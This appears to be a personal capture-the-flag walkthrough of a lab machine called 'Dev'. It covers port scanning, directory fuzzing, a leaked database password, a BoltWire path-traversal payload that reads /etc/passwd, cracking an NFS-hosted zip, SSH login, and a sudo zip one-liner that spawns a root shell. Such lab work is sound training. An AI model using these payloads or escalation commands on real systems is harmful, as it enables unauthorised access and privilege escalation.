**Dev**

For this machine. part of set up need to log in and run dhclient. This will enable ip address<br/>
<br/>
Victim IP - 192.168.247.132<br/>

<br/>
<br/>
arp scan confirm <br/>
192.168.247.132<br/>
<br/>
┌──(kali㉿kali)-[~]<br/>
└─$ nmap -T4 -p- -A 192.168.247.132<br/>
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-07 05:29 EST<br/>
Nmap scan report for 192.168.247.132<br/>
Host is up (0.0017s latency).<br/>
Not shown: 65526 closed tcp ports (conn-refused)<br/>
PORT   STATE SERVICE VERSION<br/>
22/tcp  open ssh   OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br/>
| ssh-hostkey: <br/>
|  2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)<br/>
|  256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)<br/>
|_ 256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)<br/>
<b>80/tcp  open http   Apache httpd 2.4.38 ((Debian))</b><br/>
|_http-server-header: Apache/2.4.38 (Debian)<br/>
|_http-title: Bolt - Installation error<br/>
111/tcp  open rpcbind 2-4 (RPC #100000)<br/>
| rpcinfo: <br/>
|  program version  port/proto service<br/>
|  100000 2,3,4    111/tcp  rpcbind<br/>
|  100000 2,3,4    111/udp  rpcbind<br/>
|  100000 3,4     111/tcp6 rpcbind<br/>
|  100000 3,4     111/udp6 rpcbind<br/>
|  100003 3      2049/udp  nfs<br/>
|  100003 3      2049/udp6 nfs<br/>
|  100003 3,4     2049/tcp  nfs<br/>
|  100003 3,4     2049/tcp6 nfs<br/>
|  100005 1,2,3   47900/udp  mountd<br/>
|  100005 1,2,3   49591/tcp6 mountd<br/>
|  100005 1,2,3   58301/udp6 mountd<br/>
|  100005 1,2,3   60655/tcp  mountd<br/>
|  100021 1,3,4   33019/tcp6 nlockmgr<br/>
|  100021 1,3,4   39089/tcp  nlockmgr<br/>
|  100021 1,3,4   44107/udp6 nlockmgr<br/>
|  100021 1,3,4   55133/udp  nlockmgr<br/>
|  100227 3      2049/tcp  nfs_acl<br/>
|  100227 3      2049/tcp6 nfs_acl<br/>
|  100227 3      2049/udp  nfs_acl<br/>
|_ 100227 3      2049/udp6 nfs_acl<br/>
<b>2049/tcp open nfs_acl 3 (RPC #100227)</b><br/>
<b>8080/tcp open http   Apache httpd 2.4.38 ((Debian))</b><br/>
|_http-server-header: Apache/2.4.38 (Debian)<br/>
| http-open-proxy: Potentially OPEN proxy.<br/>
|_Methods supported:CONNECTION<br/>
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()<br/>
37277/tcp open mountd  1-3 (RPC #100005)<br/>
38073/tcp open mountd  1-3 (RPC #100005)<br/>
39089/tcp open nlockmgr 1-4 (RPC #100021)<br/>
60655/tcp open mountd  1-3 (RPC #100005)<br/>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/>
<br/>
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
Nmap done: 1 IP address (1 host up) scanned in 9.00 seconds<br/>
<br/>
<br/>
Ports of note<br/>
<br/>
<b>Port 80</b><br/>
<br/>
Visit site and inspect &gt;&gt;&gt; using Bolt CMS<br/>
<img height="500" src="image.png" width="622"/><br/>
<br/>
Time to enumerate dirbuster<br/>
FFUF<br/>
<img height="250" src="image 3.png" width="615"/><br/>
<br/>
<br/>
┌──(kali㉿kali)-[~]<br/>
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.247.132/FUZZ<br/>
<br/>
    /'___\ /'___\      /'___\    <br/>
   /\ \__/ /\ \__/ __ __ /\ \__/    <br/>
   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\   <br/>
    \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/   <br/>
    \ \_\  \ \_\ \ \____/ \ \_\    <br/>
     \/_/  \/_/  \/___/  \/_/    <br/>
<br/>
   v1.3.1 Kali Exclusive &lt;3<br/>
________________________________________________<br/>
<br/>
:: Method      : GET<br/>
:: URL       : http://192.168.247.132/FUZZ<br/>
:: Wordlist     : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br/>
:: Follow redirects : false<br/>
:: Calibration   : false<br/>
:: Timeout     : 10<br/>
:: Threads     : 40<br/>
:: Matcher     : Response status: 200,204,301,302,307,401,403,405<br/>
________________________________________________<br/>
<br/>
#            [Status: 200, Size: 3833, Words: 926, Lines: 108]<br/>
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 3833, Words: 926, Lines: 108]<br/>
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 3833, Words: 926, Lines: 108]<br/>
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 3833, Words: 926, Lines: 108]<br/>
#            [Status: 200, Size: 3833, Words: 926, Lines: 108]<br/>
# directory-list-2.3-medium.txt [Status: 200, Size: 3833, Words: 926, Lines: 108]<br/>
# Priority ordered case sensative list, where entries were found [Status: 200, Size: 3833, Words: 926, Lines: 108]<br/>
# on atleast 2 different hosts [Status: 200, Size: 3833, Words: 926, Lines: 108]<br/>
<b>public </b>        [Status: 301, Size: 319, Words: 20, Lines: 10]<br/>
# This work is licensed under the Creative Commons [Status: 200, Size: 3833, Words: 926, Lines: 108]<br/>
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 3833, Words: 926, Lines: 108]<br/>
#            [Status: 200, Size: 3833, Words: 926, Lines: 108]<br/>
#            [Status: 200, Size: 3833, Words: 926, Lines: 108]<br/>
<b>src</b>          [Status: 301, Size: 316, Words: 20, Lines: 10]<br/>
<b>app </b>          [Status: 301, Size: 316, Words: 20, Lines: 10]<br/>
# Copyright 2007 James Fisher [Status: 200, Size: 3833, Words: 926, Lines: 108]<br/>
<b>vendor </b>        [Status: 301, Size: 319, Words: 20, Lines: 10]<br/>
<b>extensions</b>       [Status: 301, Size: 323, Words: 20, Lines: 10]<br/>
            [Status: 200, Size: 3833, Words: 926, Lines: 108]<br/>
            [Status: 200, Size: 3833, Words: 926, Lines: 108]<br/>
server-status      [Status: 403, Size: 280, Words: 20, Lines: 10]<br/>
:: Progress: [220560/220560] :: Job [1/1] :: 2219 req/sec :: Duration: [0:00:15] :: Errors: 0 ::<br/>
<br/>
Enumerate all subdomains, looking for points of interest.<br/>
Only subdomain of interest was /app<br/>
<br/>
<img height="250" src="image 10.png" width="351"/><br/>
app/config/config.yml has credentials save in the file<br/>
<br/>
<img height="250" src="image 11.png" width="760"/><br/>
<br/>
# If you're trying out Bolt, just keep it set to SQLite for now.<br/>
<b>database:<br/>
  driver: sqlite<br/>
  databasename: bolt<br/>
  username: bolt<br/>
</b><b>  password: I_love_java</b><br/>
<br/>
<br/>
<br/>
<b>Port 8080</b><br/>
Visit site<br/>
poss information disclosure<br/>
<img height="550" src="image 2.png" width="581"/><br/>
Time to enumerate dirbuster<br/>
FFUF<br/>
<img height="250" src="image 4.png" width="639"/><br/>
<br/>
<br/>
┌──(kali㉿kali)-[~]<br/>
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.247.132:8080/FUZZ <br/>
<br/>
    /'___\ /'___\      /'___\    <br/>
   /\ \__/ /\ \__/ __ __ /\ \__/    <br/>
   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\   <br/>
    \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/   <br/>
    \ \_\  \ \_\ \ \____/ \ \_\    <br/>
     \/_/  \/_/  \/___/  \/_/    <br/>
<br/>
   v1.3.1 Kali Exclusive &lt;3<br/>
________________________________________________<br/>
<br/>
:: Method      : GET<br/>
:: URL       : http://192.168.247.132:8080/FUZZ<br/>
:: Wordlist     : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br/>
:: Follow redirects : false<br/>
:: Calibration   : false<br/>
:: Timeout     : 10<br/>
:: Threads     : 40<br/>
:: Matcher     : Response status: 200,204,301,302,307,401,403,405<br/>
________________________________________________<br/>
<br/>
# This work is licensed under the Creative Commons [Status: 200, Size: 94602, Words: 4693, Lines: 1159]<br/>
<b>dev </b>          [Status: 301, Size: 323, Words: 20, Lines: 10]<br/>
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 94601, Words: 4693, Lines: 1159]<br/>
#            [Status: 200, Size: 94602, Words: 4693, Lines: 1159]<br/>
# directory-list-2.3-medium.txt [Status: 200, Size: 94602, Words: 4693, Lines: 1159]<br/>
#            [Status: 200, Size: 94602, Words: 4693, Lines: 1159]<br/>
            [Status: 200, Size: 94602, Words: 4693, Lines: 1159]<br/>
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 94602, Words: 4693, Lines: 1159]<br/>
# Copyright 2007 James Fisher [Status: 200, Size: 94602, Words: 4693, Lines: 1159]<br/>
# on atleast 2 different hosts [Status: 200, Size: 94602, Words: 4693, Lines: 1159]<br/>
#            [Status: 200, Size: 94602, Words: 4693, Lines: 1159]<br/>
# Priority ordered case sensative list, where entries were found [Status: 200, Size: 94602, Words: 4693, Lines: 1159]<br/>
#            [Status: 200, Size: 94602, Words: 4693, Lines: 1159]<br/>
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 94602, Words: 4693, Lines: 1159]<br/>
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 94602, Words: 4693, Lines: 1159]<br/>
            [Status: 200, Size: 94602, Words: 4693, Lines: 1159]<br/>
server-status      [Status: 403, Size: 282, Words: 20, Lines: 10]<br/>
:: Progress: [220560/220560] :: Job [1/1] :: 23526 req/sec :: Duration: [0:00:13] :: Errors: 0 ::<br/>
<br/>
<br/>
Navigate to subdomains manually, enumarating.<br/>
:8080/dev leads to regualr looking site. potentail for furether enumeration, possible SQL injections or othyer webapp vulnerabilities.<br/>
<br/>
<img height="250" src="image 9.png" width="526"/><br/>
Running boltwire<br/>
<br/>
google boltwire exploit<br/>
<br/>
https://www.exploit-db.com/exploits/48411<br/>
local file inclusion exploit<br/>
<br/>
<br/>
Steps to Reproduce:<br/>
<br/>
1) Using HTTP GET request browse to the following page<b>, whilst being authenticated user.</b><br/>
http://192.168.51.169/boltwire/<b>index.php?p=action.search&amp;action=../../../../../../../etc/passwd</b><br/>
<br/>
<img height="600" src="image 12.png" width="493"/><br/>
single user &gt;&gt; jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash<br/>
<br/>
Jean Paul = JP<br/>
link to ssh info<br/>
<br/>
<br/>
<br/>
<b>Port 2049</b><br/>
<br/>
View the potential file share directory with inbuilt showmount<br/>
syntax &gt; showmount -e &lt;ip&gt;<br/>
<br/>
<img src="image 5.png"/><br/>
<br/>
Prep for and attempt to mount the directory<br/>
<br/>
mounting and navigating tot he folder found a passworded zip file<br/>
<br/>
<img src="image 6.png"/><br/>
<br/>
<br/>
FCRACKZIP<br/>
<br/>
try crack the password<br/>
<br/>
<br/>
<img src="image 7.png"/><br/>
<br/>
-v verbose<br/>
-u unzip<br/>
-D dictionairy attack<br/>
-p file touse for attack<br/>
<br/>
<br/>
PASSWORD FOUND!!!!: pw == java101<br/>
<br/>
now unzip and navigata<br/>
<br/>
<img height="200" src="image 8.png" width="478"/><br/>
<br/>
id_rsa could be used for ssh connection. jp COULD be a user.<br/>
<br/>
information is saved!<br/>
<br/>
<br/>
<br/>
Exploint time<br/>
<br/>
Ssh using id_rsa and jeanpaul<br/>
<br/>
<img height="150" src="image 13.png" width="595"/><br/>
<br/>
asks for a password. Possible to brute force.<br/>
<br/>
additional password was ID'd earlier in the config.yml file during port 80 enumeration<br/>
<br/>
<b>I_love_java</b><br/>
<br/>
works<br/>
<br/>
<img src="image 14.png"/><br/>
<br/>
user level access<br/>
<br/>
during standard checks... <br/>
whoami<br/>
pwd<br/>
ls<br/>
sudo -l &gt; can sudo zip no password required<br/>
<br/>
google gtfobins a tool for finding priv esc with what you have<br/>
<br/>
we have sudo and zip<br/>
<br/>
<img height="400" src="image 15.png" width="476"/><br/>
<br/>
navigate to sudo and zip follow instructions<br/>
<br/>
<b>Sudo</b><br/>
<br/>
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.<br/>
<br/>
 <b> TF=$(mktemp -u)<br/>
</b><b>  sudo zip $TF /etc/hosts -T -TT 'sh #'</b><br/>
  sudo rm $TF<br/>
<br/>
<br/>
PROFIT<br/>
<br/>
<img height="250" src="image 16.png" width="624"/><br/>
<br/>
